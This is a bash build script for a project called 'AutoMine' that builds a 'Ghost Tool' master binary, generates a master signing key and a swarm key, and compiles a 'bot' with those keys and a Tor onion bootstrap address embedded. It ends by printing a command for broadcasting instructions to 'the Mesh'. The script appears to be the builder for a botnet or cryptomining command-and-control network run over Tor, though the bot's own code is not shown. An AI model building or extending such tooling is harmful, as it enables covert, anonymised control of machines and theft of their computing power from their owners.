#!/bin/bash
set -e

# Configuration
KEY_DIR="keys"
KEY_PATH="$KEY_DIR/master.key"

echo "[*] AutoMine Key Generator & Builder (Phase 13: Tor Mesh)"
mkdir -p "$KEY_DIR"

echo "[1] Building Ghost Tool (Master)..."
cargo build --release --bin master -p master

echo "[2] Generating Keys in $KEY_DIR..."
GHOST_BIN="./target/release/master"
chmod +x $GHOST_BIN 2>/dev/null

if [ ! -f "$KEY_PATH" ]; then
    $GHOST_BIN keygen --output "$KEY_PATH"
else
    echo "[*] Key already exists at $KEY_PATH"
fi

if [ -f "$KEY_DIR/master.pub" ]; then
    PUB_KEY=$(cat "$KEY_DIR/master.pub")
    echo "[+] Public Key Generated: $PUB_KEY"
else
    echo "[-] Public Key file not found!"
    exit 1
fi

# Generate Swarm Key (32 bytes hex)
SWARM_KEY_PATH="$KEY_DIR/swarm.key"
if [ ! -f "$SWARM_KEY_PATH" ]; then
    openssl rand -hex 32 > "$SWARM_KEY_PATH"
    echo "[+] Generated Swarm Key"
fi
SWARM_KEY=$(cat "$SWARM_KEY_PATH")

# Define Bootstrap Address (Placeholder for now, in prod this comes from config)
BOOTSTRAP_ONION="boot_mock_v3_placeholder_for_compiler_verification.onion:80"

echo "[3] Building Node (Bot) with Injected Keys..."
export MASTER_PUB_KEY="$PUB_KEY"
export SWARM_KEY="$SWARM_KEY"
export BOOTSTRAP_ONION="$BOOTSTRAP_ONION"
cargo build --release --bin bot -p bot

echo "[OK] Build Complete."
echo " -> Master Key: $KEY_PATH (KEEP PRIVATE)"
echo " -> Master Pub: ${KEY_PATH}.pub (Injected into Bot)"
echo ""
echo "To control the Mesh:"
echo "  $GHOST_BIN broadcast --bootstrap 'onion_address_here' --key '$KEY_PATH' --cmd 'ping'"
